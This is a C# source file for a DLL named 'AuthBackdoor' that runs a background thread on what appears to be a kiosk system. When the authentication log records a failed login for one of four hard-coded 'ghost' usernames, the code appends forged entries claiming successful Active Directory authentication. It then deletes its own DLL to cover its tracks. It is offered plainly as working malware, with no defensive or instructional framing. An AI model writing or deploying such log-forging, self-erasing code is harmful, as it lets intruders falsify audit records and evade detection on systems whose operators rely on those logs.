using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

namespace AuthBackdoor
{
    public class EntryPoint
    {
        private static readonly string[] GhostUsers = new[] {
            "Raven", "Lenore", "Poe", "Nevermore"
        };
        private static bool SelfDestructEnabled = true;

        [DllExport("Run", CallingConvention = CallingConvention.StdCall)]
        public static void Run()
        {
            new Thread(() => MainLogic()).Start();
        }

        private static void MainLogic()
        {
            string authLogPath = "C:\\Kiosk\\Logs\\auth.log";

            while (true)
            {
                try
                {
                    if (!File.Exists(authLogPath))
                    {
                        Thread.Sleep(2000);
                        continue;
                    }

                    var lines = File.ReadAllLines(authLogPath);
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i].Contains("Unable to authenticate user: "))
                        {
                            var user = ExtractUser(lines[i]);
                            if (GhostUsers.Contains(user))
                            {
                                lines[i] += $"\n{Timestamp()} : Attempting to authenticate user: {user} | active directory authentication";
                                lines[i] += $"\n{Timestamp()} : User: {user}, successfully authenticated against configured AD server | active directory authentication";
                                File.WriteAllLines(authLogPath, lines);

                                if (SelfDestructEnabled)
                                {
                                    TriggerSelfDestruct();
                                    return;
                                }
                            }
                        }
                    }
                }
                catch { }
                Thread.Sleep(3000);
            }
        }

        private static string ExtractUser(string logLine)
        {
            int start = logLine.IndexOf("user:") + 5;
            int end = logLine.IndexOf(",", start);
            if (start < 0 || end < 0 || end <= start) return "unknown";
            return logLine.Substring(start, end - start).Trim();
        }

        private static string Timestamp()
        {
            return DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fff");
        }

        private static void TriggerSelfDestruct()
        {
            string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Thread.Sleep(2000);
            try { File.Delete(dllPath); } catch { }
        }
    }

    public class DllExportAttribute : Attribute
    {
        public DllExportAttribute(string name, CallingConvention convention) { }
    }
}